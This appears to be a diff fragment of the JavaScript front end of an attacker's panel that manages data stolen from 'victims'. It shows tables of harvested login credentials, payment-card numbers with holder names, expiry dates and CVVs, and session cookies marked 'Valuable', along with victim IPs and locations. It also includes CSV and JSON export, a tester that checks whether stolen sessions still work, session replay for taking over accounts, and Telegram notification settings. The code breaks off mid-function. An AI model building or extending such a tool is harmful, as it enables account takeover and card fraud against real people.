+            document.getElementById('trashItemCount').textContent = data.length;
+            document.getElementById('trashDomainCount').textContent = domains.size;
+
+            const grid = document.getElementById('trashGrid');
+            grid.innerHTML = '';
+
+            if (data.length === 0) {
+                grid.innerHTML = `<div class="empty-state"><div class="icon">🗑️</div><h3>Trash is empty</h3></div>`;
+                return;
+            }
+
+            const sorted = Object.entries(domainStats).sort((a, b) => b[1].entries.length - a[1].entries.length);
+
+            sorted.forEach(([domain, stats]) => {
+                const card = document.createElement('div');
+                card.className = 'domain-card';
+
+                let victimsHtml = '';
+                const entries = stats.entries.slice(0, 5);
+                entries.forEach(entry => {
+                    const flag = getFlagEmoji(entry.countryCode);
+                    const deleted = entry.deletedAt ? timeAgo(entry.deletedAt) : 'Unknown';
+                    victimsHtml += `
+                        <span class="victim-tag" title="${entry.ip} · ${entry.country} · Deleted: ${formatFullTime(entry.deletedAt)}">
+                            <span class="flag">${flag}</span>
+                            <span class="ip">${entry.ip}</span>
+                            <span class="time"><span style="color:#f59e0b;">🗑️ ${deleted}</span></span>
+                        </span>
+                    `;
+                });
+                if (stats.entries.length > 5) {
+                    victimsHtml += `<span class="victim-tag" style="background:transparent;border-color:transparent;color:#475569;">+${stats.entries.length - 5}</span>`;
+                }
+
+                card.innerHTML = `
+                    <div class="header">
+                        <span class="domain">${domain}</span>
+                        <span class="badge-valuable" style="background:#f59e0b;">🗑️ Trash</span>
+                    </div>
+                    <div class="stats">
+                        <span class="victims" style="color:#f59e0b;">👤 <strong>${stats.entries.length}</strong> victims</span>
+                    </div>
+                    <div class="victims-list">${victimsHtml}</div>
+                    <div class="meta">
+                        <span>Deleted: ${stats.entries[0]?.deletedAt ? timeAgo(stats.entries[0].deletedAt) : 'Unknown'}</span>
+                        <span>${stats.entries.length} total</span>
+                    </div>
+                    <div class="actions">
+                        <button class="btn-sm" onclick="event.stopPropagation(); showRestoreAllConfirm('${domain}')" style="border-color:#00ff88;color:#00ff88;">↩️</button>
+                        <button class="btn-sm" onclick="event.stopPropagation(); showPermanentDeleteDomainConfirm('${domain}')" style="border-color:#ff4444;color:#ff4444;">🗑️</button>
+                    </div>
+                `;
+                card.onclick = () => openModal(domain, { entries: stats.entries }, 'trash');
+                grid.appendChild(card);
+            });
+        }
+
+        // ============================================================
+        // CREDENTIALS VIEW
+        // ============================================================
+
+        function renderCredsView() {
+            const wrap = document.getElementById('credsTableWrap');
+            let allCreds = [];
+            allData.forEach(entry => {
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const creds = entry.credentials || [];
+                creds.forEach(c => {
+                    allCreds.push({
+                        domain: domain,
+                        name: c.name || 'field',
+                        value: c.value,
+                        type: c.type || 'text',
+                        ip: entry.ip,
+                        time: entry.receivedAt
+                    });
+                });
+            });
+
+            if (allCreds.length === 0) {
+                wrap.innerHTML = `<div class="empty-state"><div class="icon">🔐</div><h3>No credentials stolen</h3></div>`;
+                return;
+            }
+
+            let html = `
+                <div style="font-size:11px;color:#64748b;margin-bottom:6px;">Total: ${allCreds.length} credentials</div>
+                <table class="cookies-table">
+                    <thead>
+                        <tr>
+                            <th>Domain</th>
+                            <th>Field</th>
+                            <th>Value</th>
+                            <th>Type</th>
+                            <th>IP</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            allCreds.slice(0, 150).forEach(cred => {
+                const escaped = cred.value.replace(/'/g, "\\'");
+                html += `
+                    <tr>
+                        <td class="cookie-domain">${cred.domain}</td>
+                        <td style="color:#ec4899;">${cred.name}</td>
+                        <td class="cookie-value" title="${cred.value}">${cred.value.length > 40 ? cred.value.slice(0,40)+'...' : cred.value}</td>
+                        <td style="color:#94a3b8;">${cred.type}</td>
+                        <td style="color:#64748b;">${cred.ip}</td>
+                        <td style="color:#475569;font-size:10px;">${timeAgo(cred.time)}</td>
+                    </tr>
+                `;
+            });
+
+            if (allCreds.length > 150) {
+                html += `<tr><td colspan="6" style="text-align:center;color:#475569;padding:8px;">Showing 150 of ${allCreds.length}</td></tr>`;
+            }
+
+            html += `</tbody></table>`;
+            wrap.innerHTML = html;
+        }
+
+        // ============================================================
+        // CARDS VIEW — includes cardholder name
+        // ============================================================
+
+        function renderCardsView() {
+            const wrap = document.getElementById('cardsTableWrap');
+            let allCards = [];
+            allData.forEach(entry => {
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const cards = entry.cards || [];
+                cards.forEach(c => {
+                    allCards.push({
+                        domain: domain,
+                        name: c.name || 'field',
+                        value: c.value,
+                        type: c.type || 'unknown',
+                        ip: entry.ip,
+                        time: entry.receivedAt
+                    });
+                });
+            });
+
+            if (allCards.length === 0) {
+                wrap.innerHTML = `<div class="empty-state"><div class="icon">💳</div><h3>No cards stolen</h3></div>`;
+                return;
+            }
+
+            let html = `
+                <div style="font-size:11px;color:#64748b;margin-bottom:6px;">Total: ${allCards.length} cards</div>
+                <table class="cookies-table">
+                    <thead>
+                        <tr>
+                            <th>Domain</th>
+                            <th>Field</th>
+                            <th>Value</th>
+                            <th>Type</th>
+                            <th>IP</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            allCards.slice(0, 150).forEach(card => {
+                const escaped = card.value.replace(/'/g, "\\'");
+                const typeLabel = card.type === 'card-name' ? '💳 Holder' :
+                                 card.type === 'card-number' ? '🔢 Number' :
+                                 card.type === 'expiry' ? '📅 Expiry' :
+                                 card.type === 'cvv' ? '🔒 CVV' : card.type;
+                html += `
+                    <tr>
+                        <td class="cookie-domain">${card.domain}</td>
+                        <td style="color:#06b6d4;">${card.name}</td>
+                        <td class="cookie-value" title="${card.value}">${card.value.length > 40 ? card.value.slice(0,40)+'...' : card.value}</td>
+                        <td style="color:#94a3b8;">${typeLabel}</td>
+                        <td style="color:#64748b;">${card.ip}</td>
+                        <td style="color:#475569;font-size:10px;">${timeAgo(card.time)}</td>
+                    </tr>
+                `;
+            });
+
+            if (allCards.length > 150) {
+                html += `<tr><td colspan="6" style="text-align:center;color:#475569;padding:8px;">Showing 150 of ${allCards.length}</td></tr>`;
+            }
+
+            html += `</tbody></table>`;
+            wrap.innerHTML = html;
+        }
+
+        // ============================================================
+        // COOKIES VIEW
+        // ============================================================
+
+        function renderCookiesView() {
+            const wrap = document.getElementById('cookiesTableWrap');
+
+            let allCookies = [];
+            allData.forEach(entry => {
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const cookies = entry.cookies || {};
+                Object.entries(cookies).forEach(([name, value]) => {
+                    allCookies.push({
+                        domain: domain,
+                        name: name,
+                        value: value,
+                        valuable: isValuable(name)
+                    });
+                });
+            });
+
+            if (allCookies.length === 0) {
+                wrap.innerHTML = `<div class="empty-state"><div class="icon">🍪</div><h3>No cookies stolen</h3></div>`;
+                return;
+            }
+
+            let html = `
+                <div style="font-size:11px;color:#64748b;margin-bottom:6px;">Total: ${allCookies.length} cookies</div>
+                <table class="cookies-table">
+                    <thead>
+                        <tr>
+                            <th>Domain</th>
+                            <th>Name</th>
+                            <th>Value</th>
+                            <th style="text-align:center;">Status</th>
+                            <th style="text-align:center;">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            allCookies.slice(0, 150).forEach(cookie => {
+                const escapedValue = cookie.value.replace(/'/g, "\\'");
+                html += `
+                    <tr>
+                        <td class="cookie-domain">${cookie.domain}</td>
+                        <td class="cookie-name">${cookie.name}</td>
+                        <td class="cookie-value" title="${cookie.value}">${cookie.value.length > 40 ? cookie.value.slice(0,40)+'...' : cookie.value}</td>
+                        <td style="text-align:center;">${cookie.valuable ? '<span class="cookie-valuable">Valuable</span>' : '<span style="color:#475569;font-size:8px;">—</span>'}</td>
+                        <td style="text-align:center;">
+                            <button class="btn-icon" onclick="copyCookie('${escapedValue}')" style="background:transparent;border:1px solid #1a2538;color:#64748b;padding:0 4px;border-radius:3px;cursor:pointer;font-size:8px;">📋</button>
+                        </td>
+                    </tr>
+                `;
+            });
+
+            if (allCookies.length > 150) {
+                html += `<tr><td colspan="5" style="text-align:center;color:#475569;padding:8px;">Showing 150 of ${allCookies.length}</td></tr>`;
+            }
+
+            html += `</tbody></table>`;
+            wrap.innerHTML = html;
+        }
+
+        // ============================================================
+        // VICTIMS VIEW
+        // ============================================================
+
+        function renderVictimsView() {
+            const grid = document.getElementById('victimsGrid');
+
+            if (allData.length === 0) {
+                grid.innerHTML = `<div class="empty-state"><div class="icon">👤</div><h3>No victims yet</h3></div>`;
+                return;
+            }
+
+            let html = '';
+            allData.slice().reverse().forEach(entry => {
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const flag = getFlagEmoji(entry.countryCode);
+                const cookieCount = Object.keys(entry.cookies || {}).length;
+                const credCount = (entry.credentials || []).length;
+                const cardCount = (entry.cards || []).length;
+                const time = timeAgo(entry.receivedAt);
+                const fullTime = formatFullTime(entry.receivedAt);
+                let extras = '';
+                if (credCount) extras += `🔐 ${credCount} `;
+                if (cardCount) extras += `💳 ${cardCount} `;
+
+                html += `
+                    <div class="victim-card">
+                        <div class="v-header">
+                            <span class="flag">${flag}</span>
+                            <span class="ip">${entry.ip || 'Unknown'}</span>
+                        </div>
+                        <div class="v-details">
+                            <span class="domain">${domain}</span>
+                            <span>${entry.country || 'Unknown'}</span>
+                            <span class="time" title="${fullTime}">🕐 ${time}</span>
+                        </div>
+                        <div class="v-cookies">🍪 ${cookieCount} cookies ${extras}${entry.city && entry.city !== 'N/A' ? '· 📍 ' + entry.city : ''}</div>
+                    </div>
+                `;
+            });
+
+            grid.innerHTML = html;
+        }
+
+        // ============================================================
+        // SESSION REPLAY VIEW
+        // ============================================================
+
+        function populateReplayDomains() {
+            const select = document.getElementById('replayDomainSelect');
+            const domains = new Set();
+            allData.forEach(entry => {
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                domains.add(domain);
+            });
+
+            if (domains.size === 0) {
+                select.innerHTML = '<option value="">— No domains —</option>';
+                document.getElementById('replayStatus').textContent = 'No cookies stolen yet.';
+                return;
+            }
+
+            let html = '';
+            domains.forEach(domain => {
+                html += `<option value="${domain}">${domain}</option>`;
+            });
+            select.innerHTML = html;
+            document.getElementById('replayStatus').textContent = `${domains.size} domains available`;
+        }
+
+        function replaySelectedDomain() {
+            const select = document.getElementById('replayDomainSelect');
+            const domain = select.value;
+            if (!domain) {
+                showToast('❌ Select a domain', 'error');
+                return;
+            }
+            replaySession(domain);
+        }
+
+        // ============================================================
+        // SESSION TESTER
+        // ============================================================
+
+        async function testAllDomains() {
+            if (isTestingAll) return;
+            isTestingAll = true;
+
+            const container = document.getElementById('testerResults');
+            container.innerHTML = '<div style="color:#00ff88;font-size:12px;text-align:center;">⏳ Testing...</div>';
+
+            const domains = new Set();
+            allData.forEach(entry => {
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                domains.add(domain);
+            });
+
+            if (domains.size === 0) {
+                container.innerHTML = '<div style="color:#64748b;font-size:12px;text-align:center;">No domains</div>';
+                isTestingAll = false;
+                return;
+            }
+
+            let results = [];
+            let tested = 0;
+            const total = domains.size;
+
+            for (const domain of domains) {
+                try {
+                    const result = await testSessionViaFetch(domain);
+                    results.push({ domain, valid: result.valid, message: result.message });
+                } catch (e) {
+                    results.push({ domain, valid: false, message: `⚠️ Error` });
+                }
+                tested++;
+                container.innerHTML = `<div style="color:#00ff88;font-size:12px;text-align:center;">⏳ ${tested}/${total}</div>`;
+            }
+
+            let html = '';
+            const validCount = results.filter(r => r.valid).length;
+            html += `<div style="color:#64748b;font-size:11px;margin-bottom:6px;">✅ ${validCount} valid · ❌ ${results.length - validCount} invalid</div>`;
+
+            results.forEach(r => {
+                const color = r.valid ? '#00ff88' : '#ff4444';
+                html += `
+                    <div style="display:flex;justify-content:space-between;align-items:center;background:#0b0f1a;padding:4px 10px;border-radius:4px;border:1px solid ${r.valid ? '#1a2538' : '#2a1a1a'};">
+                        <span style="color:#e2e8f0;font-size:12px;">${r.domain}</span>
+                        <span style="color:${color};font-size:12px;">${r.valid ? '✅ Valid' : '❌ Invalid'}</span>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+            isTestingAll = false;
+            showToast(`✅ ${validCount}/${results.length} valid`, 'success');
+        }
+
+        // ============================================================
+        // EXPORT VIEW
+        // ============================================================
+
+        function exportCSV() {
+            if (allData.length === 0) {
+                showToast('❌ No data', 'error');
+                return;
+            }
+            let rows = ['Domain,Cookie Name,Cookie Value,IP,Country,Time'];
+            allData.forEach(entry => {
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const cookies = entry.cookies || {};
+                Object.entries(cookies).forEach(([name, value]) => {
+                    rows.push(`"${domain}","${name}","${value.replace(/"/g, '""')}","${entry.ip || ''}","${entry.country || ''}","${entry.receivedAt || ''}"`);
+                });
+            });
+            const csv = rows.join('\n');
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${new Date().toISOString().slice(0,10)}.csv`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 CSV exported', 'success');
+        }
+
+        function exportRawJSON() {
+            if (allData.length === 0) {
+                showToast('❌ No data', 'error');
+                return;
+            }
+            const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_raw_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 Raw JSON exported', 'success');
+        }
+
+        // ============================================================
+        // MODAL — includes cardholder name in display
+        // ============================================================
+
+        function openModal(domain, stats, source) {
+            currentModalDomain = domain;
+            currentModalStats = stats;
+
+            const overlay = document.getElementById('modalOverlay');
+            const title = source === 'trash' ? `🗑️ ${domain} — ${stats.entries.length} victims in trash` :
+                          `🍪 ${domain} — ${stats.entries.length} victims, ${stats.cookies || 0} cookies`;
+
+            document.getElementById('modalTitle').textContent = title;
+
+            let html = '';
+            const entries = stats.entries || [];
+
+            entries.forEach((entry, localIdx) => {
+                const uniqueId = entry._uniqueId || 'unknown';
+                const flag = getFlagEmoji(entry.countryCode);
+                const cookies = entry.cookies || {};
+                const cookieEntries = Object.entries(cookies);
+                const fullTime = formatFullTime(entry.receivedAt);
+                const ago = timeAgo(entry.receivedAt);
+                const isTrash = source === 'trash';
+                const creds = entry.credentials || [];
+                const cards = entry.cards || [];
+
+                const deleteFn = isTrash ? `showPermanentDeleteConfirm('${uniqueId}')` : `showDeleteConfirm('${uniqueId}', '${domain}')`;
+                const restoreFn = isTrash ? `showRestoreConfirm('${uniqueId}', '${domain}')` : '';
+
+                html += `
+                    <div class="victim-entry" id="victim-${uniqueId}">
+                        <button class="delete-btn" onclick="${deleteFn}" title="${isTrash ? 'Permanently delete' : 'Move to trash'}">
+                            ${isTrash ? '🗑️' : '🗑️'}
+                        </button>
+                        ${isTrash ? `<button class="delete-btn" style="right:44px;color:#00ff88;" onclick="${restoreFn}" title="Restore">↩️</button>` : ''}
+                        <div class="victim-header">
+                            <span class="flag">${flag}</span>
+                            <span class="ip">${entry.ip}</span>
+                            <span class="country">${entry.country}</span>
+                            <span class="city">📍 ${entry.city}</span>
+                            <span class="time-badge">
+                                <span class="clock-icon">${isTrash ? '🗑️' : '🕐'}</span>
+                                <span class="full-time">${isTrash ? (entry.deletedAt ? formatFullTime(entry.deletedAt) : 'Unknown') : fullTime}</span>
+                                <span class="ago">(${isTrash ? (entry.deletedAt ? timeAgo(entry.deletedAt) : 'Unknown') : ago})</span>
+                            </span>
+                        </div>
+                        <div class="cookies-section">
+                            ${cookieEntries.length === 0 ? '<div style="color:#475569;font-size:10px;">No cookies</div>' : ''}
+                            ${cookieEntries.map(([name, value]) => {
+                                const valuable = isValuable(name);
+                                return `
+                                    <div class="cookie-item">
+                                        <span class="name">${name}</span>
+                                        <span class="value" title="${value}">${value.length > 40 ? value.slice(0,40)+'...' : value}</span>
+                                        ${valuable ? '<span class="valuable-tag">Valuable</span>' : ''}
+                                        <div class="actions">
+                                            <button class="btn-icon" onclick="copyCookie('${value.replace(/'/g, "\\'")}')">📋</button>
+                                            <button class="btn-icon" onclick="downloadCookie('${name}', '${value.replace(/'/g, "\\'")}')">⬇️</button>
+                                        </div>
+                                    </div>
+                                `;
+                            }).join('')}
+                            ${creds.length ? `<div style="margin-top:6px;border-top:1px solid #1a2538;padding-top:4px;color:#ec4899;font-size:10px;">🔐 Credentials (${creds.length})</div>
+                                ${creds.map(c => `<div style="display:flex;justify-content:space-between;font-size:9px;padding:1px 0;border-bottom:1px solid #0f1626;">
+                                    <span style="color:#94a3b8;">${c.name || 'field'}</span>
+                                    <span style="color:#f1f5f9;font-family:monospace;">${c.value}</span>
+                                    <span style="color:#475569;font-size:8px;">${c.type || ''}</span>
+                                </div>`).join('')}
+                            ` : ''}
+                            ${cards.length ? `<div style="margin-top:6px;border-top:1px solid #1a2538;padding-top:4px;color:#06b6d4;font-size:10px;">💳 Cards (${cards.length})</div>
+                                ${cards.map(c => {
+                                    const label = c.type === 'card-name' ? '💳 Holder' :
+                                                 c.type === 'card-number' ? '🔢 Number' :
+                                                 c.type === 'expiry' ? '📅 Expiry' :
+                                                 c.type === 'cvv' ? '🔒 CVV' : c.type;
+                                    return `<div style="display:flex;justify-content:space-between;font-size:9px;padding:1px 0;border-bottom:1px solid #0f1626;">
+                                        <span style="color:#94a3b8;">${c.name || 'field'} <span style="color:#475569;font-size:8px;">${label}</span></span>
+                                        <span style="color:#f1f5f9;font-family:monospace;">${c.value}</span>
+                                    </div>`;
+                                }).join('')}
+                            ` : ''}
+                        </div>
+                    </div>
+                `;
+            });
+
+            document.getElementById('modalContent').innerHTML = html;
+            document.getElementById('testResultModal').className = 'test-result';
+            overlay.classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('modalOverlay').classList.remove('active');
+        }
+
+        // ============================================================
+        // DELETE FUNCTIONS
+        // ============================================================
+
+        function showDeleteConfirm(uniqueId, domain) {
+            if (!uniqueId || uniqueId === 'unknown') {
+                showToast('❌ Invalid victim ID', 'error');
+                return;
+            }
+            showCustomConfirm(
+                'Move to Trash',
+                `Move victim from ${domain} to trash?`,
+                '🗑️',
+                () => { deleteVictim(uniqueId, domain); },
+                false
+            );
+        }
+
+        async function deleteVictim(uniqueId, domain) {
+            if (!uniqueId || uniqueId === 'unknown') {
+                showToast('❌ Invalid victim ID', 'error');
+                return;
+            }
+
+            try {
+                const res = await fetch(`/api/delete/${uniqueId}`, { method: 'DELETE' });
+                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast(`🗑️ Victim moved to trash`, 'success');
+                    await fetchData();
+                    await fetchTrash();
+                    closeModal();
+                } else {
+                    showToast('❌ ' + (data.message || 'Failed'), 'error');
+                }
+            } catch (e) {
+                showToast('❌ Error deleting', 'error');
+            }
+        }
+
+        function showRestoreConfirm(uniqueId, domain) {
+            if (!uniqueId || uniqueId === 'unknown') {
+                showToast('❌ Invalid victim ID', 'error');
+                return;
+            }
+            showCustomConfirm(
+                'Restore Victim',
+                `Restore victim to ${domain}?`,
+                '↩️',
+                () => { restoreVictim(uniqueId, domain); },
+                false
+            );
+        }
+
+        async function restoreVictim(uniqueId, domain) {
+            if (!uniqueId || uniqueId === 'unknown') {
+                showToast('❌ Invalid victim ID', 'error');
+                return;
+            }
+
+            try {
+                const res = await fetch(`/api/restore/${uniqueId}`, { method: 'POST' });
+                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast(`↩️ Victim restored to ${domain}`, 'success');
+                    await fetchTrash();
+                    await fetchData();
+                    closeModal();
+                } else {
+                    showToast('❌ ' + (data.message || 'Failed'), 'error');
+                }
+            } catch (e) {
+                showToast('❌ Error restoring', 'error');
+            }
+        }
+
+        function showPermanentDeleteConfirm(uniqueId) {
+            if (!uniqueId || uniqueId === 'unknown') {
+                showToast('❌ Invalid victim ID', 'error');
+                return;
+            }
+            showCustomConfirm(
+                'Permanently Delete',
+                'This cannot be undone.',
+                '⚠️',
+                () => { permanentlyDeleteTrash(uniqueId); },
+                true
+            );
+        }
+
+        async function permanentlyDeleteTrash(uniqueId) {
+            if (!uniqueId || uniqueId === 'unknown') {
+                showToast('❌ Invalid victim ID', 'error');
+                return;
+            }
+
+            try {
+                const res = await fetch(`/api/trash/permanent/${uniqueId}`, { method: 'DELETE' });
+                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast(`🗑️ Victim permanently deleted`, 'success');
+                    await fetchTrash();
+                    closeModal();
+                } else {
+                    showToast('❌ ' + (data.message || 'Failed'), 'error');
+                }
+            } catch (e) {
+                showToast('❌ Error deleting', 'error');
+            }
+        }
+
+        function showRestoreAllConfirm(domain) {
+            showCustomConfirm(
+                'Restore All',
+                `Restore all victims from ${domain}?`,
+                '↩️',
+                () => { restoreAllDomain(domain); },
+                false
+            );
+        }
+
+        async function restoreAllDomain(domain) {
+            const uniqueIds = [];
+            trashData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain && entry._uniqueId) {
+                    uniqueIds.push(entry._uniqueId);
+                }
+            });
+
+            let success = 0;
+            for (const uid of uniqueIds) {
+                try {
+                    const res = await fetch(`/api/restore/${uid}`, { method: 'POST' });
+                    if (res.status === 401) { window.location.href = '/login.php'; return; }
+                    const data = await res.json();
+                    if (data.status === 'ok') success++;
+                } catch {}
+            }
+            showToast(`↩️ Restored ${success} victims from ${domain}`, 'success');
+            await fetchTrash();
+            await fetchData();
+        }
+
+        function showPermanentDeleteDomainConfirm(domain) {
+            showCustomConfirm(
+                'Delete All',
+                `Permanently delete ALL victims from ${domain}?`,
+                '⚠️',
+                () => { permanentlyDeleteDomain(domain); },
+                true
+            );
+        }
+
+        async function permanentlyDeleteDomain(domain) {
+            const uniqueIds = [];
+            trashData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain && entry._uniqueId) {
+                    uniqueIds.push(entry._uniqueId);
+                }
+            });
+
+            let deleted = 0;
+            for (const uid of uniqueIds) {
+                try {
+                    const res = await fetch(`/api/trash/permanent/${uid}`, { method: 'DELETE' });
+                    if (res.status === 401) { window.location.href = '/login.php'; return; }
+                    const data = await res.json();
+                    if (data.status === 'ok') deleted++;
+                } catch {}
+            }
+            showToast(`🗑️ Permanently deleted ${deleted} victims`, 'success');
+            await fetchTrash();
+        }
+
+        function showEmptyTrashConfirm() {
+            showCustomConfirm(
+                'Empty Trash',
+                'This will permanently delete ALL victims in trash.',
+                '⚠️',
+                () => { emptyTrash(); },
+                true
+            );
+        }
+
+        async function emptyTrash() {
+            try {
+                const res = await fetch('/api/trash/empty', { method: 'DELETE' });
+                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast(`🗑️ Trash emptied (${data.count} victims)`, 'success');
+                    await fetchTrash();
+                } else {
+                    showToast('❌ ' + (data.message || 'Failed'), 'error');
+                }
+            } catch (e) {
+                showToast('❌ Error emptying trash', 'error');
+            }
+        }
+
+        function showClearAllConfirm() {
+            showCustomConfirm(
+                'Clear All Data',
+                'This will permanently delete ALL stolen data.',
+                '⚠️',
+                () => { clearData(); },
+                true
+            );
+        }
+
+        async function clearData() {
+            try {
+                const res = await fetch('/api/clear', { method: 'DELETE' });
+                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                await fetchData();
+                await fetchTrash();
+                showToast('🗑️ All data cleared', 'success');
+            } catch(e) {
+                showToast('❌ Error clearing data', 'error');
+            }
+        }
+
+        // ============================================================
+        // PASSWORD CHANGE
+        // ============================================================
+
+        function openSettings() {
+            document.getElementById('settingsOverlay').classList.add('active');
+            document.getElementById('oldPassword').value = '';
+            document.getElementById('newPassword').value = '';
+            document.getElementById('confirmPassword').value = '';
+            document.querySelectorAll('.error-text').forEach(el => el.classList.remove('show'));
+            loadTelegramSettings();
+        }
+
+        function closeSettings() {
+            document.getElementById('settingsOverlay').classList.remove('active');
+        }
+
+        async function changePassword() {
+            const oldPass = document.getElementById('oldPassword').value;
+            const newPass = document.getElementById('newPassword').value;
+            const confirmPass = document.getElementById('confirmPassword').value;
+
+            document.querySelectorAll('.error-text').forEach(el => el.classList.remove('show'));
+
+            let valid = true;
+
+            if (!oldPass) {
+                document.getElementById('oldPasswordError').textContent = 'Enter current password';
+                document.getElementById('oldPasswordError').classList.add('show');
+                valid = false;
+            }
+
+            if (newPass.length < 4) {
+                document.getElementById('newPasswordError').classList.add('show');
+                valid = false;
+            }
+
+            if (newPass !== confirmPass) {
+                document.getElementById('confirmPasswordError').classList.add('show');
+                valid = false;
+            }
+
+            if (!valid) return;
+
+            try {
+                const res = await fetch('/api/change-password', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ oldPassword: oldPass, newPassword: newPass })
+                });
+
+                if (res.status === 401) { window.location.href = '/login.php'; return; }
+
+                const data = await res.json();
+
+                if (data.status === 'ok') {
+                    showToast('✅ Password changed!', 'success');
+                    closeSettings();
+                    setTimeout(() => {
+                        window.location.href = '/password-success.php';
+                    }, 1000);
+                } else if (data.message === 'Current password is incorrect') {
+                    document.getElementById('oldPasswordError').textContent = 'Current password is incorrect';
+                    document.getElementById('oldPasswordError').classList.add('show');
+                } else {
+                    showToast('❌ ' + (data.message || 'Failed'), 'error');
+                }
+            } catch (e) {
+                showToast('❌ Error changing password', 'error');
+            }
+        }
+
+        // ============================================================
+        // TELEGRAM SETTINGS
+        // ============================================================
+
+        async function loadTelegramSettings() {
+            try {
+                const res = await fetch('/api/config/telegram');
+                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                const data = await res.json();
+                if (data) {
+                    document.getElementById('telegramToken').value = data.botToken || '';
+                    document.getElementById('telegramChatId').value = data.chatId || '';
+                    document.getElementById('telegramNotifications').checked = data.notifications !== false;
+                }
+            } catch (e) { console.log('Failed to load Telegram'); }
+        }
+
+        async function updateTelegramSettings() {
+            const botToken = document.getElementById('telegramToken').value.trim();
+            const chatId = document.getElementById('telegramChatId').value.trim();
+            const notifications = document.getElementById('telegramNotifications').checked;
+
+            if (!botToken || !chatId) {
+                showToast('❌ Bot token and chat ID required', 'error');
+                return;
+            }
+
+            if (!botToken.match(/^\d+:[A-Za-z0-9_-]+$/)) {
+                showToast('❌ Invalid token format', 'error');
+                return;
+            }
+
+            try {
+                const res = await fetch('/api/config/telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ botToken, chatId, notifications })
+                });
+                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast('✅ Telegram settings updated!', 'success');
+                } else {
+                    showToast('❌ ' + data.message, 'error');
+                }
+            } catch (e) {
+                showToast('❌ Failed to update', 'error');
+            }
+        }
+
+        // ============================================================
+        // COPY & DOWNLOAD
+        // ============================================================
+
+        function copyCookie(value) {
+            navigator.clipboard.writeText(value).then(() => {
+                showToast('✅ Cookie copied!', 'success');
+            });
+        }
+
+        function downloadCookie(name, value) {
+            const data = { name: name, value: value, exportedAt: new Date().toISOString() };
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookie_${name}_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`📥 Cookie "${name}" downloaded`, 'success');
+        }
+
+        function downloadDomain(domain) {
+            let cookies = {};
+            allData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                    Object.assign(cookies, entry.cookies || {});
+                }
+            });
+
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No cookies found', 'error');
+                return;
+            }
+
+            const data = { domain: domain, cookies: cookies, exportedAt: new Date().toISOString() };
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${domain}_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`📥 Downloaded ${Object.keys(cookies).length} cookies for ${domain}`, 'success');
+        }
+
+        // ============================================================
+        // SESSION REPLAY & TEST
+        // ============================================================
+
+        function replaySession(domain) {
+            let cookies = {};
+            allData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                    Object.assign(cookies, entry.cookies || {});
+                }
+            });
+
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No cookies found', 'error');
+                return;
+            }
+
+            const win = window.open('', '_blank');
+            if (!win) {
+                showToast('⚠️ Popup blocked. Allow popups.', 'error');
+                return;
+            }
+
+            win.document.write(`
+                <!DOCTYPE html>
+                <html><head><title>Loading...</title>
